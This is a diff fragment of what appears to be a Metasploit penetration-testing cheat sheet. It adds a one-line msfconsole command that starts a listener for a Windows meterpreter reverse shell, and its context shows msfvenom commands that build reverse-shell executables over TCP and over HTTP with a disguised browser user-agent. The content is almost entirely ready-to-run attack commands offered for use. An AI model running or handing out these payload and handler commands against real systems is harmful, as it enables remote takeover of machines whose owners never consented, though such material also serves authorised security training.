@@ -26,6 +26,9 @@ msf5>set lport
 msf5> set ExitOnSession false  
 msf5>exploit -j  
 
+# One-Liner:
+msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.234; set lport 7777; set ExitOnSession false; exploit -j"
+
 #  Windows Payloads
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe    
 msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe    
